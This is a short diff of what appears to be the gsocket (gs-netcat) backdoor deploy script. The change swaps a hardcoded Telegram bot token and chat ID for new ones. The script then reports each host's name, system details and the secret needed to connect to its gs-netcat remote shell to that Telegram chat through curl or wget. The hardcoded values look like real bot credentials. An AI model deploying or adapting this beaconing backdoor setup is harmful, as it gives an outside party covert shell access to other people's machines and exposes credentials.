@@ -47,9 +47,9 @@
 # GS_DL=wget
 #       - Command to use for download. =wget or =curl.
 # GS_TG_TOKEN=
-#       - Telegram Bot ID, =8351081348:AAF8K...
+#       - Telegram Bot ID, =8393904079:AAFi6...
 # GS_TG_CHATID=
-#       - Telegram Chat ID, =-8003777...
+#       - Telegram Chat ID, =-7328337...
 # GS_HOST=
 #       - IP or HOSTNAME of the GSRN-Server. Default is to use THC's infrastructure.
 #       - See https://github.com/hackerschoice/gsocket-relay
@@ -83,8 +83,8 @@ unset gs_deploy_webhook
 # shellcheck disable=SC2016 #Expressions don't expand in single quotes, use double quotes for that.
 msg='$(hostname) --- $(uname -rom) --- gs-netcat -i -s ${GS_SECRET}'
 ### Telegram
-GS_TG_TOKEN="8351081348:AAF8KafU0sO8YLxQOPDRPRwJdE4brvCNSig"
-GS_TG_CHATID="8003777712"
+GS_TG_TOKEN="8393904079:AAFi6ObQKxkWDuryGChWGLyxt5lv-9luV58"
+GS_TG_CHATID="7328337937"
 [[ -n $GS_TG_TOKEN ]] && [[ -n $GS_TG_CHATID ]] && {
 	GS_WEBHOOK_CURL=("--data-urlencode" "text=${msg}" "https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&parse_mode=html")
 	GS_WEBHOOK_WGET=("https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&parse_mode=html&text=${msg}")
